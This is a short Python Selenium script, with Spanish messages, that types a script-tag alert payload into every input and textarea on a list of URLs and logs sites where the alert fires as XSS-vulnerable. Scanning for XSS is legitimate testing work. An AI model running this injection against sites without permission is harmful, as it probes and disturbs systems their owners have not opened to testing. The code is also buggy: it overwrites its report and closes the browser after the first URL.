#!/usr/bin/python3
import sys
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
str="alerta maliciosa"
malicious_string="<script>alert('{}');</script>".format(str)
driver = webdriver.Chrome()
def report(url):
    with open("reporte.txt",'w') as f1:
        f1.write('url: '+url)
        f1.write('El sitio aceptó el codigo de js inyectado. Es vulnerable\n')
        f1.close()
with open(sys.argv[1]) as file:
    for url in file.readlines():
        driver.get(url)
        input_tags = driver.find_elements_by_tag_name("input")
        input_tags+=driver.find_elements_by_tag_name("textarea")
        if input_tags:
            for tag in input_tags:
                tag.send_keys(malicious_string)
                tag.send_keys(Keys.RETURN)
                try:
                    WebDriverWait(driver, 3).until(EC.alert_is_present())
                    alert = driver.switch_to.alert
                    alert.accept()
                    report(url)
                except:
                    print("No parece haber vulnerabilidad aqui")
        driver.close()
